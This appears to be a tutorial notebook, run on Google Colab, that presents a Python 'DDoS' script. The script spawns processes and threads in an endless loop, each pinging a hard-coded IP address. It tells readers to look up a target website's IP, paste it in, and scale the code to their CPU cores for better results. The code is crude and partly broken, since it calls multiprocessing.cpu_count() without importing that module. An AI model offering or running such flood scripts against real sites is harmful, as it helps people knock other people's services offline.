# Denial-of-service attack (DDoS) with Threading and Multiprocessing

**I performed these operations through Google Colab Pro.**

**What is Threading and Multiprocessing?:**
    
Threading means making breakfast while brewing tea. Multiprocessing is just like someone else preparing the table while you are preparing breakfast.

When using threading, a single operation executes two jobs from different branches simultaneously. In Multiprocessing, there are two separate processes.

**Importing the modules for threading and multiprocessing in Python, and installing the necessary packages for the ping command to run in Linux.**

```python
from multiprocessing import Process
import threading
import os

!apt-get update
!apt-get install iputils-ping
```

**Main idea**

Our main idea is to transfer the code to two independent threads asynchronously in an endless loop, and these two threads will perform two more operations asynchronously. As a result, 2 X 2 = 4 operations will be performed in each loop, ie ping the target server 4 times in each loop. Then let's code :).

**Domain, to learn the IP address of the site address**

Click on the link below and proceed to the site, then paste the link of the target site here and click query, we will use the address that comes out is our destination address. Link : http://www.ipsorgu.com/site_ip_adresi_sorgulama.php

```python
def proca():
    
    # Destination server address. Paste the destination address here.
    os.system("ping 172.82.234.64")

def procb():
    
    # Destination server address. Paste the destination address here.
    os.system("ping 172.82.234.64")

def one():
    
    # Two different operations from 2 different functions will be done in this thread.
    a = threading.Thread(target=proca)
    a.start()

    b = threading.Thread(target=procb)
    b.start()

def two():
    
    # Two different operations from 2 different functions will be done in this thread.
    a = threading.Thread(target=proca)
    a.start()

    b = threading.Thread(target=procb)
    b.start()

# Infinite ping :)
while True:
    
    # The one function starts running on another thread.
    p = Process(target=one)
    p.start() 
    # The one function is executed, but the code continues to be received from the next line.
    
    # second function, second thread
    q = Process(target=two)
    q.start()
```

**Organize the above code according to your own CPU cores. I guess you can get better results with CPUs with high multi-core performance. You can find out the total number of threads in the CPU with the code block below.**

```python
print("Total number of threads : ", multiprocessing.cpu_count())
```

